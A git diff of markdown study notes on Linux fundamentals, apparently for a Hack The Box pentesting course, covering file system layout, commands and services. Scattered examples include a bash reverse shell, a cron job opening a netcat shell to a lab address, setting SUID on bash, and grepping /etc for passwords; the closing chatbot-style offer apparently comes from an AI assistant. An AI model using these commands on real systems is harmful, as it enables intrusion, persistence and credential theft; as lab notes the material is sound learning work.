@@ -1,7 +1,72 @@
-# Linux Fundarmentals (HTB)
+# Linux Fundarmentals
+This page documents core Linux fundamentals. 
 
-### File System Hierarchy 
+## Introduction
+Linux is the backbone of modern servers, cloud infrastructure, cybersecurity tools, and hacking environments.  
+It offers **power, flexibility, automation, and control** via its command-line interface - making it **ideal for pentesting and scripting exploits**.
+
+# Linux Structure
+Linux consists of:
+* **Kernel** → Manages CPU, memory, processes.
+* **Shell** → Interface for user commands.
+* **File System** → Stores data & configurations.
+
+# File System Hierarchy
+| Directory  | Purpose                                            |
+| ---------- | -------------------------------------------------- |
+| `/`        | Root of the filesystem                             |
+| `/bin`     | Essential binaries                                 |
+| `/etc`     | Config files                                       |
+| `/var/log` | Logs (good for enumeration)                        |
+| `/home`    | User home directories                              |
+| `/tmp`     | Temporary files (writeable – useful for exploits!) |
+| `/dev`     | Device files                                       |
+| `/proc`    | Kernel & process info                              |
 ![File System Hierarchy](https://www.linuxfoundation.org/hs-fs/hubfs/Imported_Blog_Media/standard-unix-filesystem-hierarchy-1.png?width=1817&height=1001&name=standard-unix-filesystem-hierarchy-1.png)
+
+# Linux Distributions
+| Category   | Distros                                     |
+| ---------- | ------------------------------------------- |
+| Pentesting | Kali, ParrotOS                              |
+| Enterprise | RedHat, CentOS, Rocky                       |
+| Server     | Debian, Ubuntu Server                       |
+| Desktop    | Ubuntu, Linux Mint                          |
+| UNIX-based | **Solaris** (often used in legacy systems!) |
+
+identify OS: `hostnamectl`
+identify OS: `lsb_release -a`
+identify OS: `uname -a`
+determine Linux distribution: `cat /etc/*-release`
+
+# 📖 Getting Help
+| Command          | Purpose          |
+| ---------------- | ---------------- |
+| `man <cmd>`      | View manual      |
+| `<cmd> --help`   | Get help options |
+| `apropos search` | Search manpages  |
+Example: `man sudo` or `grep -r "ssh" /usr/share/man/`
+
+# 🖥️ System Information
+| Command    | Purpose      |
+| ---------- | ------------ |
+| `uname -a` | Kernel info  |
+| `df -h`    | Disk usage   |
+| `free -m`  | Memory usage |
+| `lscpu`    | CPU info     |
+
+**Example:**
+
+```bash
+cat /proc/version
+```
+
+```bash
+ps aux | grep root
+```
+
+---
+
+
 
 ### Good Commands
 + ssh [username]@[IP address] - SSH Login  
@@ -9,94 +74,363 @@
 
 
 
-> ###  Cheat Sheet
->
-> - **man xtool**	- Opens man pages for the specified tool.  
-> - **xtool -h** - Prints the help page of the tool.
-> - **apropos xkeyword** - Searches through man pages' descriptions for instances of a given keyword.
-> - **cat** - Concatenate and print files. 
-> - **whoami** - Displays current username.
-> - **id** - Returns users identity.
-> - **hostname** - Sets or prints the name of the current host system.
-> - **uname** - Prints operating system name.
-> - **pwd** - Returns working directory name.
-> - **ifconfig** - The ifconfig utility is used to assign or view an address to a network interface and/or configure network interface parameters.
-> - **ip** - Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels.  
-> - **netstat** - Shows network status.
-> - **ss** - Another utility to investigate sockets.  
-> - **ps** - Shows process status.
-> - **who** - Displays who is logged in.
-> - **env** - Prints environment or sets and executes a command.
-> - **lsblk** -	Lists block devices.
-> - **lsusb** -	Lists USB devices.
-> - **lsof** - Lists opened files.
-> - **lspci** -	Lists PCI devices.
-> - **sudo** - Execute command as a different user.
-> - **su** -	The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed.
-> - **useradd** -	Creates a new user or update default new user information.
-> - **userdel** -	Deletes a user account and related files.
-> - **usermod** -	Modifies a user account.
-> - **addgroup** -	Adds a group to the system.
-> - **delgroup** - Removes a group from the system.
-> - **passwd** -	Changes user password.
-> - **dpkg** -	Install, remove and configure Debian-based packages.
-> - **apt** -	High-level package management command-line utility.
-> - **aptitude** -	Alternative to apt.
-> - **snap** -	Install, remove and configure snap packages.
-> - **gem** -	Standard package manager for Ruby.
-> - **pip** -	Standard package manager for Python.
-> - **git** -	Revision control system command-line utility.
-> - **systemctl** -	Command-line based service and systemd control manager.
-> - **ps** - 	Prints a snapshot of the current processes.
-> - **journalctl** -	Query the systemd journal.
-> - **kill** -	Sends a signal to a process.
-> - **bg** -	Puts a process into background.
-> - **jobs** -	Lists all processes that are running in the background.
-> - **fg** -	Puts a process into the foreground.
-> - **curl** -	Command-line utility to transfer data from or to a server.
-> - **wget** -	An alternative to curl that downloads files from FTP or HTTP(s) server.
-> - **python3 -m http.server** - Starts a Python3 web server on TCP port 8000.
-> - **ls** -	Lists directory contents.
-> - **cd** - 	Changes the directory.
-> - **clear** -	Clears the terminal.
-> - **touch** -	Creates an empty file.
-> - **mkdir** -	Creates a directory.
-> - **tree** -	Lists the contents of a directory recursively.
-> - **mv** -	Move or rename files or directories.
-> - **cp** -	Copy files or directories.
-> - **nano** -	Terminal based text editor.
-> - **which** -	Returns the path to a file or link.
-> - **find** -	Searches for files in a directory hierarchy.
-> - **updatedb** -	Updates the locale database for existing contents on the system.
-> - **locate** -	Uses the locale database to find contents on the system.
-> - **more** -	Pager that is used to read STDOUT or files.
-> - **less** -	An alternative to more with more features.
-> - **head** -	Prints the first ten lines of STDOUT or a file.
-> - **tail** -	Prints the last ten lines of STDOUT or a file.
-> - **sort** -	Sorts the contents of STDOUT or a file.
-> - **grep** -	Searches for specific results that contain given patterns.
-> - **cut** -	Removes sections from each line of files.
-> - **tr** -	Replaces certain characters.
-> - **column** -	Command-line based utility that formats its input into multiple columns.
-> - **awk** -	Pattern scanning and processing language.
-> - **sed** -	A stream editor for filtering and transforming text.
-> - **wc** -	Prints newline, word, and byte counts for a given input.
-> - **chmod** -	Changes permission of a file or directory.
-> - **chown** -	Changes the owner and group of a file or directory.
+```
+**Example (privilege escalation enumeration):**
 
-...
-...
+```bash
+lsmod          # List kernel modules – find vulnerable ones
+```
 
-> ####  Questions
->
-> - **man xtool**	- Opens man pages for the specified tool.  
+```bash
+sudo -l        # Check if current user can run privileged commands
+```
+**Example (find passwords):**
 
-...
-...
+```bash
+find / -name "*.conf" 2>/dev/null
+```
 
-####  Questions
-- Q1  
-  - A1
+```bash
+grep -r "password" /etc/ 2>/dev/null
+```
+**Example (reverse shell):**
+
+```bash
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
+```
+
+```bash
+/bin/sh -c 'echo exploited!'
+```
+
+---
+
+---
+
+
+
+## 📌 Workflow
+
+---
+
+# 📂 Navigation
+
+| Command  | Purpose                 |
+| -------- | ----------------------- |
+| `pwd`    | Print current directory |
+| `cd`     | Change directory        |
+| `ls -la` | View files incl. hidden |
+
+**Example:**
+
+```bash
+cd ../../etc
+```
+
+```bash
+ls -la /home/
+```
+
+---
+
+# 📄 Working with Files & Directories
+
+**Example:**
+
+```bash
+touch exploit.sh
+```
+
+```bash
+cp /etc/passwd /tmp/pass_backup
+```
+
+---
+
+# ✏️ Editing Files
+
+| Tool   | Purpose         |
+| ------ | --------------- |
+| `nano` | Easy editor     |
+| `vim`  | Advanced editor |
+| `sed`  | Inline editing  |
+
+**Example:**
+
+```bash
+sed -i 's/false/true/' config.txt
+```
+
+```bash
+echo "bash reverse shell" >> notes.txt
+```
+
+---
+
+# 🔍 Find Files & Directories
+
+**Example:**
+
+```bash
+find / -name "*.txt" 2>/dev/null
+```
+
+```bash
+find / -perm -4000 2>/dev/null  # Find SUID binaries
+```
+
+---
+
+# 📑 Filter Contents / Regex
+
+```bash
+grep -r "password" /etc/
+```
+
+```bash
+cat file.txt | grep -E "[0-9]{10}"
+```
+
+---
+
+# 🔐 Permissions Management
+
+| Command           | Purpose            |
+| ----------------- | ------------------ |
+| `chmod`           | Change permissions |
+| `chown`           | Change ownership   |
+| `getfacl/setfacl` | ACL management     |
+
+**Example (priv-esc):**
+
+```bash
+chmod +s /bin/bash   # Bad! Enables root shell
+```
+
+```bash
+find / -writable -type f 2>/dev/null
+```
+
+---
+
+## 🧠 System Management
+
+---
+
+# 👥 User Management
+
+```bash
+cat /etc/passwd
+```
+
+```bash
+sudo useradd testuser
+```
+
+---
+
+# 📦 Package Management
+
+| Distro        | Tool                |
+| ------------- | ------------------- |
+| Debian/Ubuntu | `apt`, `dpkg`       |
+| RedHat        | `yum`, `dnf`, `rpm` |
+| Arch          | `pacman`            |
+| Solaris       | `pkgadd`, `pkgrm`   |
+
+**Example:**
+
+```bash
+apt install net-tools
+```
+
+---
+
+# ⚙️ Service & Process Management
+
+```bash
+systemctl status nginx
+```
+
+```bash
+ps aux | grep root
+```
+
+---
+
+# ⏱ Task Scheduling (Cron)
+
+**Example:**
+
+```bash
+crontab -l
+```
+
+```bash
+echo "* * * * * /bin/bash -c 'nc -e /bin/bash 10.10.14.8 4444'" >> cronjob
+```
+
+---
+
+# 🌐 Network Services
+
+```bash
+ss -tulpn
+```
+
+```bash
+netstat -ano
+```
+
+---
+
+# 💻 Web Services
+
+```bash
+curl http://10.10.10.5
+```
+
+```bash
+python3 -m http.server 80
+```
+
+---
+
+# 📦 Backup & Restore
+
+```bash
+tar -czvf backup.tar.gz /etc/
+```
+
+```bash
+rsync -av /src /dest
+```
+
+---
+
+# 📁 File System Management
+
+```bash
+mount /dev/sda1 /mnt
+```
+
+```bash
+df -h
+```
+
+---
+
+# 📜 System Logs
+
+```bash
+journalctl -u ssh
+```
+
+```bash
+grep "auth" /var/log/*
+```
+
+---
+
+# 📉 Monitoring
+
+```bash
+top
+```
+
+```bash
+htop
+```
+
+---
+
+## 📦 Containerization (Intro)
+
+| Tool           | Usage               |
+| -------------- | ------------------- |
+| Docker         | Run isolated apps   |
+| Podman         | Rootless containers |
+| LXC            | Lightweight VMs     |
+| systemd-nspawn | Linux jail-like     |
+
+**Example:**
+
+```bash
+docker run -it kalilinux/kali-rolling bash
+```
+
+---
+
+## 🌐 Networking – Linux
+
+```bash
+ip a
+```
+
+```bash
+nmcli device status
+```
+
+### Remote Desktop Protocols
+
+| Protocol | Tool          |
+| -------- | ------------- |
+| SSH      | `ssh user@ip` |
+| RDP      | `xfreerdp`    |
+| VNC      | `vncviewer`   |
+
+---
+
+### 🔥 Firewalls
+
+```bash
+ufw status
+```
+
+```bash
+iptables -L
+```
+
+---
+
+# 📋 Linux Cheat Sheet (Quick Reference)
+
+| Command             | Description         |
+| ------------------- | ------------------- |
+| `man <tool>`        | Opens man pages     |
+| `<tool> -h`         | Prints help         |
+| `apropos <keyword>` | Search manpages     |
+| `whoami`            | Print current user  |
+| `id`                | User identity       |
+| `uname -a`          | OS info             |
+| `hostname`          | Host name           |
+| `ifconfig`          | Network config      |
+| `netstat`           | Connections         |
+| `ss`                | Investigate sockets |
+| `lsof`              | List open files     |
+| `systemctl`         | Manage services     |
+| `kill`              | End process         |
+| `curl`              | Transfer data       |
+| `wget`              | Download files      |
+| `find`              | Search files        |
+| `grep`              | Search patterns     |
+| `chmod`             | File permissions    |
+| `chown`             | Change owner        |
+
+---
+
+Let me know if you'd like:
+
+* **Beginner → Advanced HTB Linux Path**
+* **Privilege Escalation Automation Script**
+* **PDF printable version**
+* **Flashcards for memory training**
+
+🔥 Ready for the next level?
+
+```bash
+sudo -l        # Check for privilege escalation vectors
+```
 
 
 
